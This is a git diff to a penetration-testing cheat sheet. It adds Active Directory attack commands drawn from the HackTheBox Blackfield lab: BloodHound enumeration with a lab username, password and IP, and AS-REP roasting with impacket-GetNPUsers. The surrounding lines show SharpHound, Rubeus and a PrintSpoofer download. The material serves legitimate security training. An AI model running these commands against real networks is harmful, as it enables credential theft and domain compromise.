@@ -1885,6 +1885,7 @@ Test-Connection -ComputerName (Get-WmiObject Win32_NetworkAdapterConfiguration |
 ### Bloodhound
 
 - Collection methods - database
+- If you don't have login with Windows AD box we can try [Gitub](https://github.com/dirkjanm/BloodHound.py)
 
 ```powershell
 # Sharphound - transfer sharphound.ps1 into the compromised machine
@@ -1892,6 +1893,8 @@ Import-Module .\Sharphound.ps1
 Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" # collects and saved with the specified details, output will be saved in windows compromised machine
 
 # Bloodhound-Python
+#HacktheBox - Blackfield box - ippsec
+python3 bloodhound -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all 
 bloodhound-python -u 'uname' -p 'pass' -ns <rhost> -d <domain-name> -c all #output will be saved in you kali machine
 ```
 
@@ -1899,6 +1902,7 @@ bloodhound-python -u 'uname' -p 'pass' -ns <rhost> -d <domain-name> -c all #outp
 
 ```powershell
 sudo neo4j console
+bloodhound
 # then upload the .json files obtained
 ```
 
@@ -2018,8 +2022,11 @@ iwr -uri http://IP:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 ```
 
 ### AS-REP Roasting
+- In Windows Active Directory, You have AD list of users but don't have password we can try the Impacket-GetNPUsers (Blackfield-HackTheBox)
 
 ```powershell
+#List of Users no password (Blackfield-HackTheBox)
+impacket-GetNPUsers -dc-ip <IP> -no-pass -usersfile users.lst blackfield/  
 impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request #this gives us the hash of AS-REP Roastable accounts, from kali linux
 .\Rubeus.exe asreproast /nowrap #dumping from compromised windows host
 
